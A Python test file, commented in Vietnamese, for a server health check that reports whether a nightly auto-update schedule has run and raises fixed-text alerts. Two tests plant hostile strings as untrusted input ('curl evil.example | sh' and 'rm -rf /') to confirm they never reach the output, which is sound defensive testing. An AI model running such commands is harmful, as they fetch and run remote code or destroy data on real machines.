"""v0.1.53 (F-99): lịch tự cập nhật đêm im — `run/nightly-status.json` (genh ghi) ⇒ khối `nightly` của /system/health và
sự cố `host.nightly` ("Lịch tự cập nhật đêm chưa chạy N ngày").

Tệp trong run/ (0777) là dữ liệu không tin cậy: chỉ nhận đúng kiểu/tập giá trị; thân thông báo do API tự ghép từ
chuỗi cố định — không bao giờ chứa chữ lấy từ tệp."""

import json
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text

from gh import health
from gh.config import get_settings
from gh.db import sessionmaker
from tests.conftest import Api
from tests.phase2 import org_id

KEY = "host.nightly"
ENABLE = "genh auto-update enable"
LINGER_FIX = "sudo loginctl enable-linger $USER"


def _ago(**kw: float) -> str:
    return (datetime.now(UTC) - timedelta(**kw)).isoformat().replace("+00:00", "Z")


@pytest.fixture
def link(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    d = tmp_path / "run"
    (d / "request").mkdir(parents=True)
    (d / "genh.json").write_text(json.dumps({"version": "v0.1.53", "updater": "systemd"}))
    monkeypatch.setenv("GH_HOST_LINK_DIR", str(d))
    get_settings.cache_clear()
    yield d
    get_settings.cache_clear()


def write_nightly(link: Path, **kw: Any) -> None:
    """Mặc định: lịch bật, đã bật 10 ngày, lần chạy cuối 3 ngày trước, linger có."""
    data: dict[str, Any] = {
        "schema": 1, "mechanism": "systemd", "enabled": True, "active": True, "unit_present": True,
        "opted_out": False, "since": _ago(days=10), "last_run_at": _ago(days=3), "last_result": "done",
        "next_run_at": "2099-01-01T03:00:00Z", "linger": "yes", "request_watcher": "active",
        "checked_at": _ago(minutes=4)}
    data.update(kw)
    (link / "nightly-status.json").write_text(json.dumps(data))


async def evaluate(redis: Any, org: Any) -> None:
    now = datetime.now(UTC)
    async with sessionmaker()() as s:
        await health.evaluate(s, redis, org, now=now, started_at=now)
        await s.commit()


async def bells(db: Any) -> list[Any]:
    await db.commit()
    q = text("SELECT title, body, link FROM core.notifications WHERE kind = 'host.nightly' ORDER BY created_at")
    return list((await db.execute(q)).all())


async def alert(db: Any) -> Any:
    await db.commit()
    return (await db.execute(text("""SELECT severity, title, body, link, fingerprint, cleared_at
                                     FROM ops.health_alerts WHERE key = 'host.nightly'"""))).one_or_none()


# ─── khối `nightly` ─────────────────────────────────────────────────────────────────────────────────────────

def test_block_warn_when_last_run_is_three_days_old(link: Path) -> None:
    write_nightly(link)
    blk = health._nightly_status()
    assert blk["state"] == "warn" and blk["days_since"] == 3 and blk["opted_out"] is False
    assert blk["linger"] == "yes" and blk["next_run_at"] == "2099-01-01T03:00:00Z"
    assert blk["last_run_at"] and blk["checked_at"]
    assert set(blk) == {"state", "reason", "last_run_at", "next_run_at", "days_since", "opted_out", "linger",
                        "checked_at"}
    assert blk["reason"] == "stale"


def test_block_thresholds_36_hours_and_days_are_floored(link: Path) -> None:
    assert health.NIGHTLY_STALE_HOURS == 36
    write_nightly(link, last_run_at=_ago(hours=35))
    assert health._nightly_status()["state"] == "ok" and health._nightly_status()["days_since"] == 1
    write_nightly(link, last_run_at=_ago(hours=37))
    blk = health._nightly_status()
    assert blk["state"] == "warn" and blk["days_since"] == 1  # 36–48 giờ ⇒ 1
    write_nightly(link, last_run_at=_ago(hours=49))
    assert health._nightly_status()["days_since"] == 2
    write_nightly(link, last_run_at=_ago(hours=2))
    blk = health._nightly_status()
    assert blk["state"] == "ok" and blk["days_since"] == 0


def test_anchor_is_the_later_of_last_run_and_since(link: Path) -> None:
    """Vừa bật lại 2 giờ trước (since mới), lần chạy cuối cách đây 5 ngày ⇒ chưa phải lúc báo — mốc là `since`."""
    write_nightly(link, since=_ago(hours=2), last_run_at=_ago(days=5))
    assert health._nightly_status()["state"] == "ok"
    # Chưa chạy lần nào, vừa bật < 36 giờ ⇒ không cảnh báo.
    write_nightly(link, since=_ago(hours=20), last_run_at="")
    blk = health._nightly_status()
    assert blk["state"] == "ok" and blk["last_run_at"] is None
    # Chưa chạy lần nào mà đã bật quá 36 giờ ⇒ cảnh báo, đếm từ lúc bật.
    write_nightly(link, since=_ago(days=4), last_run_at="")
    blk = health._nightly_status()
    assert blk["state"] == "warn" and blk["days_since"] == 4


def test_opted_out_is_off_when_the_schedule_is_really_off(link: Path) -> None:
    write_nightly(link, opted_out=True, enabled=False, active=False)
    blk = health._nightly_status()
    assert blk["state"] == "off" and blk["opted_out"] is True and blk["days_since"] is None and blk["reason"] is None
    write_nightly(link, opted_out=True, enabled=False, last_run_at="")
    assert health._nightly_status()["state"] == "off"
    # Chưa biết lịch bật hay không (genh lạ) ⇒ vẫn theo lựa chọn của Sếp.
    write_nightly(link, opted_out=True, enabled=None)
    assert health._nightly_status()["state"] == "off"


def test_opted_out_but_schedule_still_enabled_is_not_off(link: Path) -> None:
    """Dấu "Sếp đã tắt" có mà lịch VẪN bật (tắt hụt, `install --no-auto-update` đè lên máy đang có lịch, hay bật tay
    lại): máy vẫn tự lên bản mới lúc 03:00 ⇒ KHÔNG được nói "Tắt (Sếp đã tắt)"."""
    for last in (_ago(hours=2), _ago(days=5)):
        write_nightly(link, opted_out=True, enabled=True, last_run_at=last)
        blk = health._nightly_status()
        assert blk["state"] == "warn" and blk["reason"] == "opted_out_running" and blk["opted_out"] is True


def test_disabled_without_opt_out_is_warn(link: Path) -> None:
    write_nightly(link, enabled=False, active=False, last_run_at=_ago(hours=1))
    blk = health._nightly_status()
    assert blk["state"] == "warn" and blk["reason"] == "disabled"


def test_schedule_owned_by_other_install_is_other_not_warn(link: Path) -> None:
    """Bản cài phụ: lịch dùng chung thuộc bản cài khác còn sống (genh ghi enabled=false, owned_by_other=true) — không
    phải "đang tắt" (và `genh auto-update enable` ở đây bị từ chối) ⇒ 'other', không cảnh báo."""
    write_nightly(link, enabled=False, owned_by_other=True, opted_out=False)
    blk = health._nightly_status()
    assert blk["state"] == "other" and blk["reason"] is None and blk["days_since"] is None
    # genh cũ không ghi owned_by_other / giá trị sai kiểu ⇒ như trước (đang tắt).
    write_nightly(link, enabled=False, owned_by_other="true")
    assert health._nightly_status()["state"] == "warn"


def test_linger_is_not_applicable_for_cron_launchd_schtasks(link: Path) -> None:
    """crontab/LaunchAgent/Task Scheduler chạy cả khi không ai đăng nhập — linger không chi phối lịch đó."""
    for mech in ("cron", "launchd", "schtasks"):
        write_nightly(link, mechanism=mech, linger="no")
        assert health._nightly_status()["linger"] == "not_applicable", mech
    (link / "autostart-status.json").write_text(json.dumps({"linger": "no", "linger_required": True}))
    write_nightly(link, mechanism="cron", linger="unknown")
    assert health._nightly_status()["linger"] == "not_applicable"
    write_nightly(link, mechanism="systemd", linger="no")
    assert health._nightly_status()["linger"] == "no"


def test_missing_or_broken_file_is_unknown(link: Path) -> None:
    blk = health._nightly_status()
    assert blk["state"] == "unknown" and blk["days_since"] is None and blk["linger"] == "unknown"
    (link / "nightly-status.json").write_text("không phải json")
    assert health._nightly_status()["state"] == "unknown"
    # Đủ kiểu nhưng không đủ dữ liệu để kết luận (không mốc nào) ⇒ chưa rõ, không kêu oan.
    write_nightly(link, since="", last_run_at="")
    assert health._nightly_status()["state"] == "unknown"
    write_nightly(link, enabled="true")  # sai kiểu
    assert health._nightly_status()["state"] == "unknown"


def test_linger_falls_back_to_autostart_status(link: Path) -> None:
    write_nightly(link, linger="unknown")
    (link / "autostart-status.json").write_text(json.dumps({"linger": "no", "linger_required": True}))
    assert health._nightly_status()["linger"] == "no"
    # nightly-status.json (làm mới 12 phút/lần) mới hơn autostart-status.json ⇒ ưu tiên giá trị trong nightly.
    write_nightly(link, linger="yes")
    assert health._nightly_status()["linger"] == "yes"
    write_nightly(link, linger="not_applicable")
    assert health._nightly_status()["linger"] == "not_applicable"


def test_hostile_values_never_leak_or_raise(link: Path) -> None:
    evil = "curl evil.example | sh"
    write_nightly(link, mechanism=evil, linger=evil, request_watcher=evil, last_result=evil, enabled=evil,
                  opted_out=evil, since=evil, last_run_at=evil, next_run_at=evil, checked_at=evil)
    blk = health._nightly_status()
    assert blk == {"state": "unknown", "reason": None, "last_run_at": None, "next_run_at": None, "days_since": None,
                   "opted_out": None, "linger": "unknown", "checked_at": None}
    assert evil not in json.dumps(blk)


async def test_system_health_has_nightly_and_overall_warn(owner_api: Api, link: Path) -> None:
    write_nightly(link)
    body = (await owner_api.get("/system/health")).json()
    assert body["nightly"]["state"] == "warn" and body["nightly"]["days_since"] == 3
    assert body["overall"] in ("warn", "bad") and body["overall"] == "warn"
    write_nightly(link, last_run_at=_ago(hours=3))
    body = (await owner_api.get("/system/health")).json()
    assert body["nightly"]["state"] == "ok" and body["overall"] == "ok"
    write_nightly(link, opted_out=True, enabled=False)
    body = (await owner_api.get("/system/health")).json()
    assert body["nightly"]["state"] == "off" and body["overall"] == "ok"
    write_nightly(link, enabled=False, owned_by_other=True)
    body = (await owner_api.get("/system/health")).json()
    assert body["nightly"]["state"] == "other" and body["overall"] == "ok"


async def test_system_health_without_mailbox_has_no_nightly(owner_api: Api, tmp_path: Path,
                                                            monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GH_HOST_LINK_DIR", str(tmp_path / "missing"))
    get_settings.cache_clear()
    try:
        body = (await owner_api.get("/system/health")).json()
        assert "nightly" not in body
    finally:
        get_settings.cache_clear()


async def test_system_health_with_mailbox_but_old_genh_says_unknown(owner_api: Api, link: Path) -> None:
    body = (await owner_api.get("/system/health")).json()
    assert body["nightly"]["state"] == "unknown" and body["overall"] == "ok"


# ─── sự cố host.nightly ─────────────────────────────────────────────────────────────────────────────────────

async def test_stale_schedule_rings_once_with_fixed_body(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link)
    await evaluate(redis, org)
    await evaluate(redis, org)  # gọi lần hai: không chuông thứ hai
    rows = await bells(db)
    assert len(rows) == 1
    assert rows[0].title == "Lịch tự cập nhật đêm chưa chạy 3 ngày"
    assert rows[0].link == health.HEALTH_LINK
    assert rows[0].body == ("Máy chủ không tự lên bản mới. Trên máy chủ chạy: genh auto-update status"
                            " · Sau đó bật lại lịch: genh auto-update enable")
    assert ENABLE in rows[0].body and "enable-linger" not in rows[0].body
    a = await alert(db)
    assert a.severity == "warn" and a.cleared_at is None and a.fingerprint == "stale"
    [issue] = await health.active_issues(db, org)
    assert issue["kind"] == KEY and issue["action"] == "Xem cách bật lại" and issue["link"] == health.HEALTH_LINK
    # Không dấu chấm dính sau lệnh (Sếp chép nguyên dòng).
    assert not issue["body"].rstrip().endswith(".")


async def test_days_grow_without_a_second_bell_but_title_refreshes(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link, last_run_at=_ago(hours=40))
    await evaluate(redis, org)
    assert (await bells(db))[0].title == "Lịch tự cập nhật đêm đã hơn 1 ngày chưa chạy"
    write_nightly(link, last_run_at=_ago(days=4))
    await evaluate(redis, org)
    assert len(await bells(db)) == 1
    assert (await alert(db)).title == "Lịch tự cập nhật đêm chưa chạy 4 ngày"


async def test_linger_off_adds_the_enable_linger_step(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link, linger="no")
    await evaluate(redis, org)
    [row] = await bells(db)
    assert row.body == ("Máy chủ không tự lên bản mới. Trên máy chủ chạy: genh auto-update status"
                        " · Tiến trình nền chỉ chạy khi có người đăng nhập — chạy một lần: "
                        "sudo loginctl enable-linger $USER · Sau đó bật lại lịch: genh auto-update enable")
    assert LINGER_FIX in row.body and ENABLE in row.body
    assert (await alert(db)).fingerprint == "linger"


async def test_linger_taken_from_autostart_when_nightly_does_not_know(owner_api: Api, app, db, redis,  # type: ignore[no-untyped-def]
                                                                      link: Path) -> None:
    org = await org_id(db)
    write_nightly(link, linger="unknown")
    (link / "autostart-status.json").write_text(json.dumps({"linger": "no", "linger_required": True}))
    await evaluate(redis, org)
    [row] = await bells(db)
    assert LINGER_FIX in row.body


async def test_cause_change_rings_again(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    """Đổi nguyên nhân (đang tắt → thiếu linger) là tin mới; cùng nguyên nhân thì không lặp."""
    org = await org_id(db)
    write_nightly(link, enabled=False, active=False)
    await evaluate(redis, org)
    [row] = await bells(db)
    assert row.title == "Lịch tự cập nhật đêm đang tắt" and (await alert(db)).fingerprint == "disabled"
    write_nightly(link, enabled=False, active=False, linger="no")
    await evaluate(redis, org)
    assert len(await bells(db)) == 1  # vẫn "đang tắt" — chỉ thân thêm bước linger, không chuông mới
    assert LINGER_FIX in (await alert(db)).body
    write_nightly(link, linger="no")  # bật lại nhưng linger tắt ⇒ không chạy được
    await evaluate(redis, org)
    assert len(await bells(db)) == 2 and (await alert(db)).fingerprint == "linger"


async def test_opted_out_raises_nothing_and_closes_open_incident(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link, opted_out=True, enabled=False, active=False)
    await evaluate(redis, org)
    assert await alert(db) is None and await bells(db) == []
    write_nightly(link)
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is None
    # Sếp tự tắt bằng `genh auto-update disable` ⇒ hết sự cố
    write_nightly(link, opted_out=True, enabled=False, active=False)
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is not None
    assert await health.active_issues(db, org) == []


async def test_recent_enable_without_first_run_raises_nothing(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link, since=_ago(hours=20), last_run_at="", last_result="")
    await evaluate(redis, org)
    assert await alert(db) is None and await bells(db) == []


async def test_running_again_clears_and_a_relapse_rings_anew(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_nightly(link)
    await evaluate(redis, org)
    assert len(await bells(db)) == 1
    write_nightly(link, last_run_at=_ago(hours=1))  # lịch đêm chạy lại
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is not None
    assert await health.active_issues(db, org) == []
    write_nightly(link, last_run_at=_ago(days=2))  # lại im
    await evaluate(redis, org)
    assert len(await bells(db)) == 2
    assert (await alert(db)).cleared_at is None


async def test_unknown_leaves_an_open_incident_alone(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    """Tệp tạm thiếu/hỏng (đang được ghi lại, genh cũ) ⇒ không đóng oan cũng không mở mới."""
    org = await org_id(db)
    write_nightly(link)
    await evaluate(redis, org)
    (link / "nightly-status.json").write_text("{")
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is None and len(await bells(db)) == 1
    (link / "nightly-status.json").unlink()
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is None


async def test_no_mailbox_no_incident(owner_api: Api, app, db, redis, tmp_path: Path,
                                      monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    monkeypatch.setenv("GH_HOST_LINK_DIR", str(tmp_path / "missing"))
    get_settings.cache_clear()
    try:
        await evaluate(redis, org)
        assert await alert(db) is None
    finally:
        get_settings.cache_clear()


async def test_hostile_values_do_not_reach_the_incident_body(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    evil = "xóa hết dữ liệu: rm -rf /"
    write_nightly(link, mechanism=evil, linger=evil, request_watcher=evil, last_result=evil, next_run_at=evil)
    await evaluate(redis, org)
    [row] = await bells(db)
    assert evil not in row.body and evil not in row.title
    assert row.body.endswith(ENABLE) and "enable-linger" not in row.body


async def test_opted_out_but_still_enabled_rings_with_both_choices(owner_api: Api, app, db, redis,  # type: ignore[no-untyped-def]
                                                                    link: Path) -> None:
    """Sếp đã tắt mà lịch vẫn bật ⇒ một chuông nói thật (máy vẫn tự cập nhật lúc 03:00) + hai lựa chọn, Sếp tự quyết."""
    org = await org_id(db)
    write_nightly(link, opted_out=True, enabled=True, last_run_at=_ago(hours=3))
    await evaluate(redis, org)
    await evaluate(redis, org)
    [row] = await bells(db)
    assert row.title == "Sếp đã tắt tự cập nhật đêm nhưng lịch vẫn bật"
    assert row.body == ("Máy chủ vẫn tự lên bản mới khoảng 03:00. Trên máy chủ chạy: genh auto-update status"
                        " · Muốn tắt hẳn: genh auto-update disable · Muốn giữ tự cập nhật: genh auto-update enable")
    assert (await alert(db)).fingerprint == "opted_out_running"
    # Tắt hẳn được (lịch không còn bật) ⇒ hết sự cố.
    write_nightly(link, opted_out=True, enabled=False, active=False)
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is not None


async def test_owned_by_other_raises_nothing_and_closes_open_incident(owner_api: Api, app, db, redis,  # type: ignore[no-untyped-def]
                                                                       link: Path) -> None:
    """Bản cài phụ: không chuông "đang tắt" mãi với lối ra là lệnh bị từ chối (OwnedByOtherError)."""
    org = await org_id(db)
    write_nightly(link, enabled=False, active=False, owned_by_other=True)
    await evaluate(redis, org)
    assert await alert(db) is None and await bells(db) == []
    write_nightly(link, enabled=False, active=False)  # genh cũ: chưa biết là của bản khác ⇒ "đang tắt"
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is None
    write_nightly(link, enabled=False, active=False, owned_by_other=True)
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is not None
    assert await health.active_issues(db, org) == []


async def test_cron_schedule_with_linger_off_does_not_blame_linger(owner_api: Api, app, db, redis,  # type: ignore[no-untyped-def]
                                                                    link: Path) -> None:
    """Lịch đêm là crontab (máy không có systemd --user): linger 'no' không phải nguyên nhân ⇒ không nhắc
    enable-linger."""
    org = await org_id(db)
    write_nightly(link, mechanism="cron", linger="no", active=None)
    (link / "autostart-status.json").write_text(json.dumps({"linger": "no", "linger_required": False}))
    await evaluate(redis, org)
    [row] = await bells(db)
    assert "enable-linger" not in row.body and row.body.endswith(ENABLE)
    assert (await alert(db)).fingerprint == "stale"
